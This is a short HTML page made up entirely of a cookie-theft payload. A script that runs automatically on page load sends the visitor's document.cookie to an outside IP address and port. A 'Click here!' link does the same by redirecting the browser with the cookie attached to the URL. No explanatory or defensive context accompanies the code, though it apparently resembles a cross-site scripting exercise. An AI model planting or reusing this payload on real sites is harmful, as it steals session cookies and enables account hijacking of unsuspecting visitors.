<!DOCTYPE html>
<html>

<!-- Automatic Get Script -->
<script type="text/javascript">
	var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "http://147.222.204.171:2344/?" + document.cookie, true); // true for asynchronous 
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            console.log(xmlHttp.responseText);
	    }
    }
    
    xmlHttp.send(null);
</script>

<body>

<!-- Get Link -->
<a href="#" onclick="window.location = 'http://147.222.204.171:2344/?' + document.cookie;" target="_blank">Click here!</a>




</body>
</html>
